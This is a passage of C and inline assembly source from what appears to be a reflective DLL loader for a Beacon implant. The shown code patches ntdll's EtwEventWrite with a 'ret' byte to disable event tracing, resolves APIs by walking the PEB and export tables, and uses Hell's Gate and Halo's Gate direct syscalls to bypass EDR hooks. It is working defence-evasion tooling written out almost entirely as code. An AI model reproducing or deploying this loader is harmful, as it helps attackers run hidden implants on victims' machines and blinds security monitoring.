            if (!NT_SUCCESS(status))
                return;
            #endif
        }
    }

    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
    char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    void* pEtwEventWrite  = xGetProcAddress(eew, ntdll);

    if (pEtwEventWrite != NULL) {
        unsigned char etwbypass[] = { 0xc3 }; // ret
        Base = pEtwEventWrite;
        Size = sizeof(etwbypass);
        #ifdef SYSCALLS
        // make memory region RWX
        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        // write the bypass
        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
        // make memory region RX again
        HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
        status = ((tNtProt)HellDescent)(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        #else
        // make memory region RWX
        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        // write the bypass
        Memcpy(pEtwEventWrite, etwbypass, sizeof(etwbypass));
        // make memory region RX again
        status = pNtProtectVirtualMemory(NtCurrentProcess(), &Base, &Size, oldprotect, &oldprotect);
        if (!NT_SUCCESS(status))
            return;
        #endif
    }
    return;
}
#endif

__asm__(
"getRip: \n"
    "mov rax, [rsp] \n"             // get the return address
    "ret \n"
"getMachineType: \n"
    "add rcx, 0x4 \n"
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n"
"getRdllBase: \n"
    "mov rbx, 0x5A4D \n"            // "MZ" bytes for comparing if we are at the start of our reflective DLL
"dec: \n"
    "dec rcx \n"
    "cmp bx, word ptr ds:[rcx] \n"  // Compare the first 2 bytes of the page to "MZ"
    "jne dec \n"
    "xor rax, rax \n"
    "mov ax, [rcx+0x3C] \n"         // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add rax, rcx \n"               // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "xor rbx, rbx \n"
    "add bx, 0x4550 \n"             // PEOO
    "cmp bx, word ptr ds:[rax] \n " // Compare the 4 bytes to PE\0\0
    "jne getRdllBase \n"
    "mov rax, rcx \n"               // Return the base address of our reflective DLL
    "ret \n"                        // return initRdllAddr
"getDllBase: \n"
    "mov rbx, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "mov rbx, [rbx+0x18] \n"        // _PEB_LDR_DATA
    "mov rbx, [rbx+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, rbx \n"
"crawl: \n"
    "push rbx \n"                   // just to save its value
    "push rcx \n"
    "mov rdx, [rbx+0x20] \n"        // DllBase
    "mov rcx, rdx \n"
    "call getExportDirectory \n"
    "pop rcx \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x0c] \n"
    "add rdx, rbx \n"               // ASCII name of the DLL
    "call cmpstrings \n"
    "pop rbx \n"
    "cmp rax, 0x1 \n"
    "je found \n"
    "mov rbx, [rbx] \n"             // InMemoryOrderLinks Next Entry
    "cmp r11, [rbx] \n"             // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor rax, rax \n"               // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov rax, [rbx+0x20] \n"        // DllBase Address in process memory
"end: \n"
    "ret \n"
"getFirstEntry: \n"
    "mov rax, gs:[0x60] \n"         // ProcessEnvironmentBlock // GS = TEB
    "mov rax, [rax+0x18] \n"        // _PEB_LDR_DATA
    "mov rax, [rax+0x20] \n"        // InMemoryOrderModuleList - First Entry (probably the host PE File)
    "ret \n"
"getNextEntry: \n"
    "mov rax, [rcx] \n"
    "cmp rdx, [rax] \n"             // Are we back at the same entry in the list?
    "jne notTheLast \n"
    "xor rax, rax \n"
"notTheLast: \n"
    "ret \n"
"getDllBaseFromEntry: \n"
    "mov rax, [rcx+0x20] \n"
    "ret \n"
"cmpstrings: \n"
    "xor rax, rax \n"               // counter
"cmpchar: \n"
    "mov sil, [rcx+rax] \n"         // load char
    "cmp sil, 0x0 \n"
    "je nolow1 \n"
    "or sil, 0x20 \n"               // make lower case
"nolow1: \n"
    "mov dil, [rdx+rax] \n"         // load char
    "cmp dil, 0x0 \n"
    "je nolow2 \n"
    "or dil, 0x20 \n"               // make lower case
"nolow2: \n"
    "cmp sil, dil \n"               // compare
    "jne nonequal \n"
    "cmp sil, 0x0 \n"               // end of string?
    "je equal \n"
    "inc rax \n"
    "jmp cmpchar \n"
"nonequal: \n"
    "mov rax, 0x0 \n"               // return "false"
    "ret \n"
"equal: \n"
    "mov rax, 0x1 \n"               // return "true"
    "ret \n"
"getExportDirectory: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x88] \n"
    "add rax, r8 \n"
    "ret \n" // return ExportDirectory;
"getExportDirectorySize: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rax, rax \n"
    "mov eax, [rbx+0x8c] \n"
    "ret \n" // return ExportDirectory Size;
"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"              // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"             // RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"              // DWORD AddressOfFunctions; // 0x20 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNames
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x24 \n"              // DWORD AddressOfNameOrdinals; // 0x24 offset
    "mov eax, [rdx] \n"             // RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"               // VA ExportAddressOfNameOrdinals
    "ret \n" // return ExportOrdinalTable;
"getNumberOfNames: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x18] \n"
    "ret \n"
"getSymbolAddress: \n"
    "mov r10, [rsp+0x28] \n"        // ExportNameTable
    "mov r11, [rsp+0x30] \n"        // ExportOrdinalTable
    "xor rax, rax \n"
    "mov eax, [rsp+0x38] \n"        // NumberOfNames
    "dec rax \n"
    "xchg rcx, rdx \n"              // symbolStringSize & RDX =symbolString
    "push rcx \n"                   // push str len to stack
"lFindSym: \n"
    "mov rcx, [rsp] \n"             // DWORD symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"       // RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"                // &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"               // Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                 // Compare strings at RDI & RSI
    "je FoundSym \n"                // If match then we found the API string. Now we need to find the Address of the API
    "test rax, rax \n"
    "je NotFoundSym \n"             // If we check every exported function, return NULL
    "dec rax \n"                    // Decrement to check if the next name matches
    "jmp short lFindSym \n"         // Jump back to start of loop
"FoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"        // [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"        // RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"                // module.<API> = RVA module.<API> + module.dll BaseAddress
    "ret \n"
"NotFoundSym: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "xor rax, rax \n"
    "ret \n"
"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"        // Offset NewEXEHeader
    "add rax, rcx \n"               // &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "ret \n" // return dllSize;
"getDllSizeOfHeaders: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x54] \n"        // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "ret \n" // return SizeOfHeaders;
"Memcpy: \n"
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 == 0, ret
    "ret \n"
"copy1: \n"
    "dec r8 \n"                     // Decrement the counter
    "mov bl, [rdx] \n"              // Load the next byte to write into the BL register
    "mov [rcx], bl \n"              // write the byte
    "inc rdx \n"                    // move rdx to next byte of source
    "inc rcx \n"                    // move rcx to next byte of destination
    "test r8, r8 \n"                // check if r8 = 0
    "jne copy1 \n"                  // if r8 != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "add rcx, 0x14 \n"              // &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rcx] \n"              // Value of FileHeader.SizeOfOptionalHeader
    "xchg rax, rbx \n"
    "ret \n"
"add: \n"
    "add rcx, rdx \n"
    "xchg rax, rcx \n"
    "ret \n"
"getNumberOfSections: \n"
    "add rcx, 0x6 \n"               // &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n"
"getBeaconEntryPoint: \n"
    "add rdx, 0x10 \n"              // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"               // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
"copyWithDelimiter: \n"
    "xor rax, rax \n"               // number of bytes copied
    "copyLoop: \n"
    "mov r10, rax \n"
    "sub r10, r8 \n"                // check if we copied enough bytes
    "jns copydone \n"
    "mov bl, [rdx] \n"              // read byte
    "mov [rcx], bl \n"              // write byte
    "inc rdx \n"
    "inc rcx \n"
    "inc rax \n"                    // increment bytes written
    "cmp bl, r9b \n"                // check if we found the delimiter
    "je copydone\n"
    "jmp copyLoop \n"
    "copydone: \n"
    "ret \n"
);

#ifdef SYSCALLS
__asm__(
"getSyscallNumber: \n"
    "push rcx \n"
    "call findSyscallNumber \n"     // try to read the syscall directly
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothooked \n"
    "mov dx, 0 \n"                 // index = 0
"loopoversyscalls: \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateUp\n"            // try to read the syscall above
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookedup \n"
    "push rcx \n"
    "push dx \n"
    "call halosGateDown\n"          // try to read the syscall below
    "pop dx \n"
    "pop rcx \n"
    "test ax, ax \n"
    "jne syscallnothookeddown \n"
    "inc dx \n"                    // increment the index
    "jmp loopoversyscalls \n"
"syscallnothooked: \n"
    "ret \n"
"syscallnothookedup: \n"
    "sub ax, dx \n"
    "ret \n"
"syscallnothookeddown: \n"
    "add ax, dx \n"
    "ret \n"
"findSyscallNumber: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"error: \n"
    "xor rax, rax \n"
    "ret \n"
"halosGateUp: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "add rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"halosGateDown: \n"
    "xor rsi, rsi \n"
    "xor rdi, rdi \n"
    "mov rsi, 0x00B8D18B4C \n"
    "xor rax, rax \n"
    "mov al, 0x20 \n"
    "mul dx \n"
    "sub rcx, rax \n"
    "mov edi, [rcx] \n"
    "cmp rsi, rdi \n"
    "jne error \n"
    "xor rax,rax \n"
    "mov ax, [rcx+4] \n"
    "ret \n"
"HellsGate: \n"
    "xor r11, r11 \n"
    "mov r11d, ecx \n"
    "ret \n"
"HellDescent: \n"
    "xor rax, rax \n"
    "mov r10, rcx \n"
    "mov eax, r11d \n"
    "syscall \n"
    "ret \n"
);
#endif
